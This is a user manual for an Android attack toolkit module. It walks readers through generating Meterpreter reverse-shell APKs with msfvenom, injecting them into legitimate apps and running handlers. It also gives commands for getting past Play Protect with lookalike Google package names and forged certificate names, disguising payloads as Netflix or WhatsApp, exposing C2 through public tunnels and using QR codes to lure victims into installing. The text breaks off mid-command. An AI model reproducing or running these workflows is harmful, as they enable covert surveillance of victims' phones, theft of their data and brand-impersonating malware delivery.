# secV · android\_pentest - Complete Manual

**Version 2.4.3 "tauri" · Author: 0xb0rn3 | SecVulnHub**

> **Who this is for.** If you have never heard of ADB, Metasploit, or a reverse shell, start at
> Chapter 1 and read forward. If you are an experienced pentester, jump to the chapter you need.
> If you want to contribute to this module, read everything and then go to Part IV.
> This document is the single source of truth for the module - no prior knowledge is assumed.

---

## Table of Contents

### Part I - Foundations (start here if you are new)
1. [How Computers Talk to Each Other](#1-how-computers-talk-to-each-other)
2. [What a Port Is](#2-what-a-port-is)
3. [What a Protocol Is](#3-what-a-protocol-is)
4. [What Port Forwarding and Tunnels Are](#4-what-port-forwarding-and-tunnels-are)
5. [What JSON Is](#5-what-json-is)
6. [What a Payload Is](#6-what-a-payload-is)
7. [What a Reverse Shell Is](#7-what-a-reverse-shell-is)
8. [What Metasploit Is](#8-what-metasploit-is)
9. [What Meterpreter Is](#9-what-meterpreter-is)
10. [What an APK Is](#10-what-an-apk-is)
11. [What ADB Is](#11-what-adb-is)
12. [What Frida Is](#12-what-frida-is)
13. [What a CVE Is](#13-what-a-cve-is)

### Part II - Setup and First Use
14. [Installation - All Tiers](#14-installation--all-tiers)
15. [Connecting Your Device](#15-connecting-your-device)
16. [Launching the GUI](#16-launching-the-gui)
17. [Launching via CLI](#17-launching-via-cli)
18. [Understanding the GUI Layout](#18-understanding-the-gui-layout)

### Part III - Every Operation, Explained
19. [Recon & Analysis Operations](#19-recon--analysis-operations)
20. [Access & Escalation Operations](#20-access--escalation-operations)
21. [Payload & Delivery Operations](#21-payload--delivery-operations)
22. [Instrumentation Operations](#22-instrumentation-operations)
23. [Persistence Operations](#23-persistence-operations)
24. [C2 & Agent Operations](#24-c2--agent-operations)
25. [Evasion & Customization Operations](#25-evasion--customization-operations)
26. [Live Media Operations](#26-live-media-operations)
27. [Automated Chain Operations](#27-automated-chain-operations)

### Part IV - Deep Dives
28. [The APK Build Pipeline](#28-the-apk-build-pipeline)
29. [BootBuddy and Boot Persistence](#29-bootbuddy-and-boot-persistence)
30. [WAN C2 - Working Without Port Forwarding](#30-wan-c2--working-without-port-forwarding)
31. [The Screen Mirror and Live Media System](#31-the-screen-mirror-and-live-media-system)
32. [The Embedded PTY Shell](#32-the-embedded-pty-shell)
33. [Dependency System and Package Managers](#33-dependency-system-and-package-managers)

### Part V - Reference
34. [Global Parameter Reference](#34-global-parameter-reference)
35. [Vulnerability Database](#35-vulnerability-database)
36. [Artifact Locations](#36-artifact-locations)
37. [Troubleshooting](#37-troubleshooting)

### Part VI - Contributing and Module Development
38. [How the Module Talks to secV](#38-how-the-module-talks-to-secv)
39. [Module Architecture - Where Everything Lives](#39-module-architecture--where-everything-lives)
40. [Adding a New Operation](#40-adding-a-new-operation)
41. [Adding a New GUI Panel](#41-adding-a-new-gui-panel)
42. [Adding a New API Endpoint](#42-adding-a-new-api-endpoint)
43. [Contribution Checklist](#43-contribution-checklist)

---

# Part I - Foundations

## 1. How Computers Talk to Each Other

Every device on a network has an **IP address** - a number that works like a postal address.
When your laptop is on WiFi it might have an address like `192.168.1.42`. When an Android
phone joins the same WiFi it might be `192.168.1.105`.

Data travels between devices in packets - small chunks of bytes. Each packet says where it
came from (source IP) and where it is going (destination IP).

The internet is made of millions of networks. To reach a device that is not on your local
network, your packets travel through routers that forward them hop-by-hop until they arrive.

**Public vs. private IP addresses**

Private addresses (`192.168.x.x`, `10.x.x.x`, `172.16–31.x.x`) are only visible inside a
local network. Your home router has one public address visible to the internet and many private
addresses assigned to the devices connected to it.

This matters for penetration testing because: if a target Android phone is on mobile data
(4G/5G), it has a private address behind the carrier's NAT. You cannot directly reach it
from your laptop unless you use a tunnel (explained in Chapter 4).

---

## 2. What a Port Is

Imagine an IP address as a building's street address. A **port** is the specific door number
inside that building. One computer can run many different programs, each listening on a
different port.

Ports are numbers from 0 to 65535.

**Common ports you will encounter:**

| Port | Service |
|------|---------|
| 22 | SSH (remote shell, encrypted) |
| 80 | HTTP (web, unencrypted) |
| 443 | HTTPS (web, encrypted) |
| 4444 | Default Metasploit listener |
| 5555 | ADB over WiFi |
| 8080 | Alternative HTTP / proxy |
| 8897 | secV Android GUI |

When a Meterpreter payload calls back to you, it opens a connection from the phone to your
IP address on a specific port - usually 4444. Your listener (Metasploit's multi/handler) has
to be waiting on that port before the connection arrives, otherwise the payload has nowhere
to connect and dies.

**LHOST** means "listening host" - your IP address.
**LPORT** means "listening port" - the port your handler is waiting on.

---

## 3. What a Protocol Is

A **protocol** is a set of rules that both sides of a connection agree to follow so they can
understand each other. If ports are doors, protocols are the languages spoken through them.

**TCP** (Transmission Control Protocol): Reliable. Guarantees every packet arrives in order.
Used for most things - web, SSH, Meterpreter reverse_tcp.

**UDP** (User Datagram Protocol): Fast but unreliable. No guarantees. Used for video, DNS,
gaming.

**HTTP vs. HTTPS**: HTTP is plain text. Anyone watching the network can read it. HTTPS wraps
HTTP in TLS encryption - the content is unreadable to an eavesdropper.

For Meterpreter, `reverse_tcp` uses raw TCP and is the most reliable option on a local
network. `reverse_http` and `reverse_https` disguise the traffic as web browsing - useful
when a firewall blocks random ports but allows HTTP/HTTPS.

---

## 4. What Port Forwarding and Tunnels Are

### The problem

Your laptop is behind your home router. Its private IP might be `192.168.1.42`. If a victim
device is on mobile data, it cannot reach `192.168.1.42` because that address only exists
inside your home network.

### Port forwarding

Your router has a public IP (e.g. `203.0.113.5`). You can configure your router to forward
all incoming connections on port 4444 to your laptop's private IP on port 4444. Now someone
outside your network can reach your Metasploit listener at `203.0.113.5:4444`.

Limitation: requires access to the router admin panel, not always possible (corporate network,
shared ISP, carrier-grade NAT).

### Tunnels (bore / Cloudflare)

A tunnel is a connection from your machine out to a public server that relays traffic back in.
Because the connection is initiated from your side (outbound), no router configuration is
needed.

**bore**: A lightweight open-source tunnel. Your machine connects to `bore.pub`. Bore assigns
you a random public port like `bore.pub:37421`. Anything that connects to `bore.pub:37421`
gets forwarded to `localhost:4444` on your machine.

```
Phone → bore.pub:37421 → your machine's localhost:4444 → Metasploit handler
```

**Cloudflare Tunnel (cloudflared)**: Similar idea, uses Cloudflare's global network.
The `wan_expose` operation tries cloudflared first, then falls back to bore if cloudflared
is not installed.

This is why `LHOST` can be set to `bore.pub` (or auto-detected) and `LPORT` set to the
bore-assigned port - the payload on the phone calls back to bore, bore forwards to you.

---

## 5. What JSON Is

**JSON** (JavaScript Object Notation) is a way to write structured data as plain text.
It is the language secV uses to pass data between the shell and modules, and between the
GUI server and the browser.

```json
{
  "name": "oxbv1",
  "age": 22,
  "skills": ["python", "android", "frida"],
  "device": {
    "model": "Pixel 8",
    "rooted": true
  }
}
```

Rules:
- Data is in `"key": value` pairs
- Strings (text) go in double quotes: `"hello"`
- Numbers have no quotes: `42`, `3.14`
- Booleans are `true` or `false` (no quotes, lowercase)
- Arrays are wrapped in `[` `]`
- Objects are wrapped in `{` `}`

When you run an operation from the secV shell, the shell bundles all your parameters into a
JSON object and sends it to the Python module on stdin. The module reads that JSON, does its
work, and prints results as JSON on stdout. secV reads that and displays it.

---

## 6. What a Payload Is

A **payload** is code that runs on the target to give the attacker some capability. In the
context of Android pentesting, payloads are usually:

**1. APK payloads** - An Android app (`.apk` file) that looks normal but secretly opens a
connection back to the attacker when installed and run. Metasploit can generate these with
`msfvenom`. The user is socially engineered into installing it.

**2. Shellcode payloads** - Raw machine code injected into a running process. Used in
exploit development. Less common for Android without root.

**3. Script payloads** - Shell scripts pushed via ADB that run on the device. Used when
you already have ADB access.

**Staged vs. stageless payloads**

A **staged** payload is small - it just opens a connection and downloads the real payload
(the "stage") from the attacker. This keeps the APK smaller and lets you swap the stage.
`android/meterpreter/reverse_tcp` is staged.

A **stageless** payload has everything built in - larger file but works even if the network
is restricted after initial connection. `android/meterpreter_reverse_tcp` is stageless.

**How payload detection works**

Antivirus (AV) and Google Play Protect scan APKs for known signatures - patterns of bytes
that appear in known malicious code. Metasploit payloads have well-known signatures. That
is why raw `deploy_shell` APKs are detected immediately - Play Protect recognizes the
`com.metasploit.stage` package and the Payload.smali bytecode pattern.

The `bypass_play_protect` operation changes the package name, removes suspicious patterns,
and adds noise classes. The `rebuild` operation goes further - the APK contains no Meterpreter
bytecode at all, only a loader that fetches the payload from a tunnel at runtime.

---

## 7. What a Reverse Shell Is

A **shell** is a command-line interface where you type commands and get output. On Android
it looks like the Unix shell - `ls`, `cat`, `id`, `whoami`.

In a normal connection, you (the client) connect to the server. In a **reverse shell**, the
target connects to you. This works around firewalls: the target is allowed to make outbound
connections, so even if no ports are open on the target, the reverse shell still connects out.

```
Normal:   You → port 22 on server    (requires open port on server)
Reverse:  Target → port 4444 on you  (requires only outbound from target)
```

Once the reverse shell connects, you have a command prompt running on the target device.
Everything you type is executed there; the output comes back to you.

Metasploit's multi/handler is a listener that catches reverse shell connections. It knows
the protocol of the specific payload (Meterpreter) and gives you an interactive session.

---

## 8. What Metasploit Is

**Metasploit Framework** is an open-source penetration testing platform. It provides:

- **msfvenom** - a payload generator. Takes a payload type, LHOST, LPORT, and output format,
  produces the file (APK, ELF, EXE, raw shellcode, etc.)
- **msfconsole** - the interactive shell where you load modules, set options, and run exploits
- **Exploit modules** - code for specific vulnerabilities
- **multi/handler** - a generic listener that catches reverse shells from msfvenom payloads
- **Meterpreter** - an advanced post-exploitation agent (see next chapter)

**Basic Metasploit workflow for Android:**

```
# 1. Generate the payload APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.42 LPORT=4444 -o payload.apk

# 2. Start the handler (before the victim installs the app)
msfconsole -q -x "use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; \
  set LHOST 192.168.1.42; set LPORT 4444; set ExitOnSession false; run -j"

# 3. Victim installs and opens payload.apk
# 4. Session opens in msfconsole
```

secV automates steps 1 and 2 completely. `deploy_shell` generates the APK; `msf_handler`
starts the listener with the correct RC file.

---

## 9. What Meterpreter Is

**Meterpreter** is Metasploit's advanced payload agent. Unlike a simple reverse shell
(which just gives you a `sh` prompt), Meterpreter runs an in-memory agent on the target
that exposes specific commands without needing to spawn a shell process for each one.

Android Meterpreter commands you will use:

```
sysinfo            → device model, OS version
getuid             → which UID the payload is running as
screenshot         → take a PNG screenshot, save to local machine
webcam_snap        → capture a camera frame
webcam_stream -l 0.0.0.0 -p 8880  → start MJPEG stream on port 8880
record_mic -d 10   → record microphone for 10 seconds
shell              → drop to an interactive Android shell
upload /file /sdcard/  → push a file to device
download /sdcard/x /tmp/  → pull a file from device
```

The Live Media panel in the secV GUI wraps these commands - you click "▶ MSF" and it runs
the right Meterpreter command and displays the result.

---

## 10. What an APK Is

An **APK** (Android Package) is the file format for Android apps - like a `.exe` on Windows
or a `.dmg` on Mac.

Internally, an APK is a ZIP archive containing:

```
META-INF/           → signature files
AndroidManifest.xml → app metadata: permissions, components, package name
classes.dex         → compiled Dalvik bytecode (the actual app code)
res/                → resources: icons, layouts, strings
lib/                → native .so libraries (ARM/x86 code)
assets/             → raw asset files
```

**APK security concepts:**

- **Package name**: A unique identifier like `com.netflix.mediaclient`. Play Protect uses
  this to identify apps.
- **Permissions**: Declared in the manifest. `RECORD_AUDIO`, `CAMERA`, `READ_CONTACTS`, etc.
  Android asks the user to grant dangerous permissions at runtime (Android 6+).
- **Signing**: Every APK must be signed with a certificate before installation. The signature
  proves who built the app. The `secv.keystore` file is used to re-sign modified APKs.
- **Smali**: The human-readable assembly language for Dalvik bytecode. `apktool d app.apk`
  decompiles the DEX to smali files. `apktool b` recompiles them back to DEX.

When the module injects a Meterpreter payload into an APK, it:
1. Decompiles the APK to smali
2. Adds Meterpreter smali classes
3. Modifies the manifest to add the payload's service/receiver
4. Recompiles and re-signs

---

## 11. What ADB Is

**ADB** (Android Debug Bridge) is a command-line tool that lets a computer communicate with
an Android device over USB or WiFi. It is part of the Android SDK Platform Tools.

ADB lets you:
- Install and uninstall APKs
- Copy files to and from the device
- Run shell commands on the device
- Capture the screen
- Read device logs
- Forward ports

**Enabling ADB on your device:**

1. Go to **Settings → About Phone**
2. Tap **Build Number** seven times - "Developer options" unlocks
3. Go to **Settings → Developer Options**
4. Enable **USB Debugging**
5. Connect via USB - accept the "Allow USB Debugging?" dialog on the phone

**ADB commands used by this module:**

```bash
adb devices                              # list connected devices
adb -s <serial> shell                    # open shell on specific device
adb install app.apk                      # install APK
adb exec-out screencap -p > screen.png  # screenshot (binary safe)
adb shell wm size                        # get screen resolution
adb tcpip 5555                           # enable ADB over WiFi
adb connect 192.168.1.105:5555           # connect wirelessly
```

**ADB over WiFi** (used by the `adb_wifi` operation): after running `adb tcpip 5555`, you
can disconnect USB and use `adb connect <device-ip>:5555` from across the room (or across
the network). The `device_monitor.sh` script watches for devices and auto-connects.

---

## 12. What Frida Is

**Frida** is a dynamic instrumentation toolkit. It lets you inject JavaScript code into a
running process and intercept, modify, or observe its behaviour in real time - without
recompiling the app.

Why this matters:

- **SSL pinning bypass**: Many apps verify that the server certificate matches a hardcoded
  value (pinning), preventing you from using a proxy to intercept HTTPS traffic. Frida scripts
  hook the SSL verification functions and make them always return success.
- **Root detection bypass**: Some banking apps check if the device is rooted and refuse to run.
  Frida hooks the check functions and makes them return false.
- **Credential dumping**: Hook `login()`, `authenticate()`, or `sha256()` to capture plaintext
  credentials before they are hashed.
- **Method tracing**: Log every call to a specific class or method to understand app behaviour.

**How it works:**

1. `frida-server` runs on the Android device (requires root or Objection-patched APK)
2. On your machine, `frida-tools` connects to it and injects your JavaScript
3. The script runs inside the app's process

The `frida_hook` operation handles all of this - it pushes frida-server, connects, and runs
the appropriate script for the chosen `hook_mode`.

**Objection** builds on Frida to automate common tasks. The `objection_patch` operation
injects the Frida gadget into the APK at build time - so frida-server is not needed at
runtime. The gadget loads when the app starts.

---

## 13. What a CVE Is

**CVE** (Common Vulnerabilities and Exposures) is a standardized naming system for publicly
known security vulnerabilities. Each CVE has a unique ID: `CVE-YEAR-NUMBER`.

Examples relevant to this module:

| CVE | Vulnerability | Impact |
|-----|--------------|--------|
| CVE-2024-0044 | `run-as` privilege escalation (Android ≤14 QPR2) | Escape app sandbox, read any app's data |
| CVE-2023-45866 | Bluetooth HID injection (unauthenticated) | Send keystrokes to device without pairing |
| CVE-2024-31317 | System server privilege escalation | Root-level access via ADB |

The `exploit_cve` operation attempts these against the connected device. The `vuln_scan`
operation checks whether the device's Android version and patch level make it susceptible.

**NVD** (National Vulnerability Database) is the US government's index of all CVEs, with
severity scores (CVSS). The module queries NVD via API when `--nvd-api-key` is set to get
real-time CVE data for the detected Android version.

---

# Part II - Setup and First Use

## 14. Installation - All Tiers

The module works at four tiers. Each tier unlocks more operations.

### Tier 1 - Minimal (device recon only)

Requires only ADB. No APK tools, no Python extras.

```bash
# Arch / Manjaro / CachyOS
sudo pacman -S android-tools

# Debian / Ubuntu / Kali
sudo apt install android-tools-adb

# Verify
adb version
```

Available: `recon`, `adb_wifi`, `device_net_scan`, basic `inject_agent`

### Tier 2 - Standard (APK analysis)

```bash
# Arch
sudo pacman -S apktool jdk-openjdk

# Kali / Debian
sudo apt install apktool aapt default-jdk
```

Available: all Tier 1, plus `app_scan`, `vuln_scan`, `exploit`

### Tier 3 - Full (code decompilation + payload generation)

```bash
# Arch (with AUR helper)
yay -S android-tools apktool jdk-openjdk jadx

# Kali / Debian
sudo apt install android-tools-adb apktool aapt default-jdk jadx

# Metasploit (already on Kali; Arch: see below)
# Kali: msfconsole is pre-installed
# Arch: yay -S metasploit
```

Available: all Tier 2, plus `backdoor_apk`, `deploy_shell`, `rebuild`, `msf_handler`

### Tier 4 - Runtime instrumentation

```bash
pip3 install frida-tools objection requests cryptography pillow qrcode
```

Available: all Tier 3, plus `frida_hook`, `objection_patch`, `bypass_play_protect`,
`customize_apk`, `qr_exploit`, `wan_expose`

### All-in-one (Arch with yay)

```bash
yay -S android-tools apktool jdk-openjdk jadx metasploit ffmpeg
pip3 install frida-tools objection requests cryptography pillow qrcode
```

### All-in-one (Kali)

```bash
sudo apt install android-tools-adb apktool aapt default-jdk jadx ffmpeg
pip3 install frida-tools objection requests cryptography pillow qrcode
```

### Checking your installation

In the GUI: click the **Deps** tab. Every tool shows its install status and the exact
install command for your package manager (auto-detected).

In the CLI:
```bash
secv android --operation deps
```

---

## 15. Connecting Your Device

### USB (recommended first)

1. On your Android: Settings → About Phone → tap **Build Number** 7 times
2. Settings → Developer Options → enable **USB Debugging**
3. Connect USB cable
4. On the phone: tap **Allow** on the "Allow USB Debugging?" prompt
5. Verify: `adb devices` - the device should show with status `device` (not `unauthorized`)

**If it shows `unauthorized`:** The trust dialog was not accepted. Revoke all ADB
authorizations in Developer Options, disconnect, reconnect, and accept the dialog again.

**If it shows `offline`:** Unplug and reconnect. Run `adb kill-server && adb start-server`.

### WiFi (after initial USB setup)

```bash
# Connect USB first, then:
adb tcpip 5555                      # tell device to listen on port 5555
adb connect 192.168.1.105:5555      # connect wirelessly (replace with device IP)
# Now unplug USB
adb devices                          # should show 192.168.1.105:5555 device
```

Or use the GUI: in the Ops sidebar → Access & Escalation → **adb wifi** → click Run.

### Multiple devices

If multiple devices are connected, every operation needs `--device <serial>` in the CLI or
the device selector in the GUI. Serials look like `emulator-5554`, `192.168.1.105:5555`, or
a hardware serial like `R38M9023VBC`.

---

## 16. Launching the GUI

```bash
# From the secV shell
secV ❯ use android_pentest
secV (android_pentest) ❯ set mode gui
secV (android_pentest) ❯ run

# Or directly
python3 /path/to/secV/tools/mobile/android/android_gui.py

# Custom port
python3 android_gui.py --port 9000
```

Open `http://127.0.0.1:8897` in your browser. You should see the secV Android GUI.

The GUI is a single-page web application served by a Python HTTP server. The browser and
server communicate via REST API calls (`/api/*`) and Server-Sent Events (SSE) for real-time
streaming output. You do not need an internet connection - everything runs locally.

---

## 17. Launching via CLI

The CLI is for automation, scripting, and situations where a browser is inconvenient.

```bash
# Basic pattern
secv android --operation <name> [--parameter value ...]

# Examples
secv android --operation recon
secv android --operation app_scan --package com.target.app
secv android --operation deploy_shell --lhost auto --lport 4444
secv android --operation full_pwn --lhost 192.168.1.42
```

Add `--serve false` to get JSON output instead of the interactive TUI:
```bash
secv android --operation recon --serve false | jq .device
```

---

## 18. Understanding the GUI Layout

```
┌─ TOPBAR ─────────────────────────────────────────────────────────┐
│ secV/android pentest   [device badge]   LHOST   [⊟ ops]  [tabs] │
└───────────────────────────────────────────────────────────────────┘
┌─ SIDEBAR (ops) ──┐ ┌─ MAIN PANEL ─────────────────────────────────┐
│ Recon & Analysis │ │  [Ops] [P&D] [Live] [Shell] [Files] [C2]     │
│  recon           │ │                                                │
│  app_scan        │ │  ← operation parameter form appears here       │
│  vuln_scan       │ │    when you click an op in the sidebar         │
│  exploit         │ │                                                │
│  ...             │ │                                                │
│ Access & Escalat.│ │                                                │
│  adb_wifi        │ │                                                │
│  get_root        │ │                                                │
│  ...             │ │                                                │
└──────────────────┘ └────────────────────────────────────────────────┘
```

**Topbar:**
- Device badge - shows connected device name and Android version
- LHOST indicator - shows current attacker IP
- **⊟ ops** button - toggles the operations sidebar
- Tab buttons - switch between Ops/P&D/Live/Shell/Files/C2

**Sidebar:** Click any operation to load its configuration form in the center.
Each operation shows a description, its parameters, and an equivalent CLI command at the bottom.

**Tabs:**
| Tab | What it does |
|-----|-------------|
| **Ops** | Operations configuration and run |
| **P&D** | Payload and Delivery builder with APK file browser |
| **Live** | Screen mirror, camera, microphone, speaker, MSF console |
| **Shell** | Embedded PTY terminal (your local zsh/bash) |
| **Files** | Host + device dual-pane file manager |
| **C2** | C2 dashboard (bore tunnels, sessions, logs) |

---

# Part III - Every Operation, Explained

## 19. Recon & Analysis Operations

### `recon` - Device Fingerprinting

**What it does:** Connects to the device over ADB and reads every piece of security-relevant
information it can without modifying anything on the device. Think of it as taking inventory.

**What it checks:**
- Device model, manufacturer, Android version, SDK API level
- CPU architecture (arm64-v8a, armeabi-v7a, x86_64)
- Whether the device is **rooted** - checked by looking for `su` binary, Magisk, KernelSU,
  SuperSU, Zygisk, `/system/xbin/su`, `/data/local/tmp/su`
- Bootloader lock status
- SELinux mode (enforcing = some exploits blocked, permissive = easier)
- Full-disk or file-based encryption status
- Screen lock type (PIN, password, pattern, none)
- Developer mode / USB debugging on or off
- ADB network access (if port 5555 is listening - critical vulnerability)
- Security patch level (month/year when last updated)
- Kernel version
- Battery level and device uptime

**CLI:**
```bash
secv android --operation recon
secv android --operation recon --device 192.168.1.105:5555
```

**Output:** A structured security profile. Key fields: `rooted`, `selinux`, `patch_level`,
`encrypted`, `adb_network`.

---

### `app_scan` - Static APK Analysis

**What it does:** Pulls the APK for the target package from the device (using `adb pull`),
decompiles it with `apktool`, and performs static analysis - reading the code without running
it. Like reading a book vs. actually going to the places it describes.

**Analysis stages:**

1. **Manifest audit** - reads `AndroidManifest.xml`. Checks:
   - `android:debuggable="true"` - the app can be debugged in production (HIGH risk)
   - `android:allowBackup="true"` - anyone with ADB can pull all the app's data
   - `android:usesCleartextTraffic="true"` - the app sends unencrypted HTTP
   - Exported Activities/Services/Receivers/Providers without permission guards
   - Dangerous permissions (`READ_CONTACTS`, `CAMERA`, `RECORD_AUDIO`, etc.)

2. **Secret scanning** - searches decompiled smali and assets for patterns like:
   - AWS access keys (`AKIA...`)
   - API keys, tokens, private keys
   - Hardcoded passwords
   - JWT tokens
   - Credit card patterns
   - Private IP addresses

3. **Code vulnerability scan** - looks for dangerous patterns:
   - `WebView.addJavascriptInterface()` without proper `@JavascriptInterface` annotation
   - SQL query string concatenation (potential injection)
   - `MD5`/`SHA1`/`DES`/`ECB` usage (weak crypto)
   - `StrictMode` disabled (common in production by mistake)
   - `setJavaScriptEnabled(true)` in WebViews

4. **Deep analysis** (`--deep-analysis true`) - runs `jadx` to decompile DEX to Java.
   More readable than smali and catches more patterns, but 5–10x slower.

**CLI:**
```bash
secv android --operation app_scan --package com.target.app
secv android --operation app_scan --package com.target.app --deep-analysis true --search-secrets true
secv android --operation app_scan --scan-limit 10   # scan top 10 installed apps
```

**Security score:** 0–100. Points deducted for each finding weighted by severity.

---

### `vuln_scan` - Vulnerability Assessment

**What it does:** Combines device-level checks with app analysis to produce a CVSS-weighted
vulnerability report. When an NVD API key is provided, it queries the National Vulnerability
Database for CVEs affecting the detected Android version.

```bash
secv android --operation vuln_scan
secv android --operation vuln_scan --package com.target.app --nvd-api-key YOUR_KEY
```

**Output:** List of findings sorted by severity (CRITICAL → HIGH → MEDIUM → LOW → INFO),
each with: description, affected component, CVSS score if available, and remediation advice.

---

### `exploit` - Component Exploitation Testing

**What it does:** Tests whether discovered vulnerabilities are actually exploitable. All tests
are **non-destructive** - they probe but do not modify or damage data.

**Tests performed:**

- **Content Provider SQL injection:** Sends a `'` and SQL control characters to exported
  content providers. If the error message leaks SQL syntax, it is vulnerable.
- **Intent injection:** Sends crafted intents to exported Activities and Services with
  unexpected data. Checks if they crash, leak data, or perform unintended actions.
- **Path traversal:** Sends `../../../etc/passwd` style paths to file-serving endpoints.
- **Activity launching:** Starts exported Activities that should require authentication.

```bash
secv android --operation exploit --package com.target.app
```

---

### `network` - Traffic Capture & Analysis

**What it does:** Captures network traffic from the device. Needs root for full packet
capture. Without root, reads logcat for credential leakage.

```bash
secv android --operation network
secv android --operation network --proxy true --proxy-host 192.168.1.10 --proxy-port 8080
```

**With root:** Runs `tcpdump` on the device, captures to a PCAP file, pulls it back.
Parses for cleartext credentials, HTTP requests, DNS queries.

**With proxy:** Sets the WiFi proxy on the device to your Burp/mitmproxy instance.
Combined with `--bypass-ssl true` (uses Frida to defeat pinning), you can read all HTTPS traffic.

---

### `forensics` - Data Extraction

**What it does:** Pulls as much data from the device as possible. Some paths require root.

```bash
secv android --operation forensics
secv android --operation forensics --package com.target.app --backup true
```

**Extracted artifacts (no root):**
- App databases from `/data/data/<package>/databases/` (debuggable apps only)
- SharedPreferences XML
- Logcat (last ~10k lines)
- App-accessible external storage

**With root:**
- SMS database
- Call logs
- Contacts database
- Full `/data/data/<package>/` directory
- System logs (evtlog, radio, crash)

**ADB backup (`--backup true`):** Creates an ADB backup `.ab` file. This is a tar archive
of all app data for apps that have `allowBackup="true"`.

---

### `device_net_scan` - Device Network Scan

**What it does:** Gets the device's WiFi IP address, then runs a network scan of the local
subnet. Useful for pivoting - once you have access to the device, you can use it to discover
other hosts on its network.

```bash
secv android --operation device_net_scan
```

---

### `full` - Complete Assessment

Chains recon → app_scan → vuln_scan → exploit → network → forensics in sequence.

```bash
secv android --operation full --package com.target.app --deep-analysis true
```

---

## 20. Access & Escalation Operations

### `adb_wifi` - Enable ADB over WiFi

Sends `adb tcpip 5555` to the device. After this, you can unplug USB and connect wirelessly
with `adb connect <device-ip>:5555`.

```bash
secv android --operation adb_wifi
secv android --operation adb_wifi --adb-port 6000   # custom port
```

---

### `get_root` - Multi-Vector Root Acquisition

**What it does:** Tries multiple root acquisition methods in order, stopping at first success.

**Methods tried, in order:**

1. **Magisk/su detection** - checks if `su` binary already exists. If yes, confirms root access.
2. **`adb root`** - works on userdebug and eng builds (development devices, emulators).
3. **CVE-2024-0044** - a privilege escalation in Android's `run-as` command affecting
   Android 12–14 before the 2024 QPR2 patch. Exploits a TOCTOU race in the UID check to
   read any app's data directory without root.
4. **mtk-su** - MediaTek-specific root exploit for older MT6xxx devices.
5. **KernelSU/APatch detection** - checks if these alternative root methods are active.

```bash
secv android --operation get_root
```

---

### `exploit_cve` - Targeted CVE Exploit

```bash
secv android --operation exploit_cve --cve CVE-2024-0044
secv android --operation exploit_cve --cve CVE-2023-45866
```

See Chapter 13 for CVE descriptions.

---

### `cve_chain` - Chained CVE Escalation

Attempts a predefined chain of CVEs to escalate privileges step by step.

```bash
secv android --operation cve_chain
```

---

### `zero_click` - Zero-Interaction Attack Surfaces

**What it does:** Tests attack surfaces that don't require the user to click anything -
the target just has to have a certain feature enabled.

- **NFC:** Crafts NFC NDEF records that trigger Android Beam / NFC tag dispatch to launch
  activities or open URLs.
- **Bluetooth HID:** Tests CVE-2023-45866 - sending HID keyboard injection packets over
  Bluetooth without pairing.
- **WiFi:** Tests for deauth vulnerability, probe response manipulation.

```bash
secv android --operation zero_click
```

---

## 21. Payload & Delivery Operations

### `backdoor_apk` - APK Injection

**What it does:** Takes a legitimate installed app, injects Meterpreter, re-signs it.

**The process:**
1. Pull the original APK from the device: `adb shell pm path com.target.app` → `adb pull`
2. Run `msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> -x original.apk -o backdoored.apk`
   (the `-x` flag uses the original APK as a template - Meterpreter is injected into it)
3. Re-sign with `secv.keystore`
4. Optionally: uninstall original + install backdoored version

```bash
secv android --operation backdoor_apk \
  --package com.target.app \
  --lhost 192.168.1.42 \
  --lport 4444 \
  --payload android/meterpreter/reverse_http \
  --install false

# With WAN tunnel (bore)
secv android --operation backdoor_apk \
  --package com.target.app \
  --lhost bore.pub \
  --lport 37421              # the bore-assigned port
```

**Detection risk:** The original app's icon and name are preserved. Play Protect will likely
flag it unless combined with `bypass_play_protect`.

---

### `deploy_shell` - Generate Fresh Payload APK

Generates a new msfvenom APK (not injected into anything - it is a standalone payload app),
signs it, serves it via HTTP on `serve_port`, and installs it via ADB if a device is connected.

```bash
secv android --operation deploy_shell \
  --lhost 192.168.1.42 \
  --lport 4444 \
  --payload android/meterpreter/reverse_tcp

# WAN
secv android --operation deploy_shell --lhost auto --payload android/meterpreter/reverse_https
```

**Note:** The generated APK has the package name `com.metasploit.stage` and a generic icon.
Play Protect will flag it unless `bypass_play_protect` is run on the output.

---

### `bypass_play_protect` - Evasion Repackaging

**What it does:** Transforms a Metasploit APK so it bypasses Play Protect static scanning.

**Steps performed:**
1. Decompile APK with apktool
2. Rename the `com.metasploit.stage` package to a GMS-lookalike (e.g. `com.google.android.gms.persistent`) or your custom `--fake-pkg`
3. Rename `MainActivity`, `MainService` to generic class names
4. Scrub manifest URI schemes that trigger heuristics (`metasploit://`, `stage://`)
5. Inject a decoy class with legitimate-looking API calls (contacts, location)
6. Re-sign with a new certificate using CN matching a real company: `--app-name "Google LLC"`

```bash
secv android --operation bypass_play_protect \
  --apk-path ~/.secv/android/payloads/payload.apk \
  --app-name "Netflix Inc."

secv android --operation bypass_play_protect \
  --apk-path /tmp/shell.apk \
  --fake-pkg com.google.android.gms.persistent \
  --app-name "Google LLC"
```

**Output:** `~/.secv/android/payloads/evaded.apk`

---

### `customize_apk` - Cosmetic APK Patching

Changes the visible appearance of an APK - icon, name, package ID - without touching the
payload functionality. Used after `bypass_play_protect` to make the app look convincing.

**What it patches:**
- All 6 mipmap icon densities: mdpi (48px), hdpi (72px), xhdpi (96px), xxhdpi (144px),
  xxxhdpi (192px), anydpi-v26 (adaptive icon)
- `android:label` in the manifest (launcher name)
- `applicationId` / package name throughout manifest and smali

```bash
secv android --operation customize_apk \
  --apk-path ~/.secv/android/payloads/evaded.apk \
  --app-label "Netflix" \
  --package-name com.netflix.mediastream \
  --icon-path /path/to/netflix_icon.png \
  --output-name Netflix_v8.114.apk

# Icon from URL
secv android --operation customize_apk \
  --apk-path /tmp/evaded.apk \
  --app-label "WhatsApp" \
  --package-name com.whatsapp.messenger \
  --icon-path https://example.com/wa.png
```

---

### `wan_expose` - Public WAN Exposure

Makes your Metasploit listener and APK HTTP server reachable from anywhere on the internet.

**With cloudflared:**
```
cloudflared tunnel --url http://localhost:8888
→ gives you a URL like https://random-name.trycloudflare.com
```

**Without cloudflared (bore fallback):**
```
bore local 8888 --to bore.pub
→ gives you bore.pub:<random-port>
```

```bash
secv android --operation wan_expose --lport 4444 --serve-port 8888
```

A QR code is generated encoding the public APK download URL.

---

### `qr_exploit` - QR Code Payload Delivery

Generates a QR code for various delivery scenarios.

```bash
# APK download URL
secv android --operation qr_exploit --qr-mode apk \
